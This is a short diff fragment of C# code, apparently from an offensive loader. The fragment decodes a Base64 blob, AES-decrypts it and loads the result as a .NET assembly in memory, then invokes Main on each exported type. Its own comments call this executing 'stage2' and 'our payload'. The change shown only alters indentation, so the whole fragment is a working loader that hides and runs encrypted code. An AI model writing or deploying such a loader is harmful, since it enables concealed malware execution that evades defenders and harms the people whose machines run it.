@@ -13,11 +13,11 @@ namespace Default {
 		public static void Main() {
             
             // decode / decrypt stage2 + payload
-			byte[] bytes = System.Convert.FromBase64String(encryptedStringWithIV);
-			bytes = decryptStringFromBytes_Aes(bytes.Skip(16).ToArray(), System.Text.Encoding.ASCII.GetBytes(key), bytes.Take(16).ToArray());
-			
-			// excute stage2 which include our payload (dot net assembly dll) from bytes
-			Assembly dllAssembly = Assembly.Load(bytes);			
+            byte[] bytes = System.Convert.FromBase64String(encryptedStringWithIV);
+            bytes = decryptStringFromBytes_Aes(bytes.Skip(16).ToArray(), System.Text.Encoding.ASCII.GetBytes(key), bytes.Take(16).ToArray());
+
+            // excute stage2 which include our payload (dot net assembly dll) from bytes
+            Assembly dllAssembly = Assembly.Load(bytes);			
             foreach(Type type in dllAssembly.GetExportedTypes()) {
                 var c = Activator.CreateInstance(type);
                 type.InvokeMember("Main", BindingFlags.InvokeMethod, null, c, null);
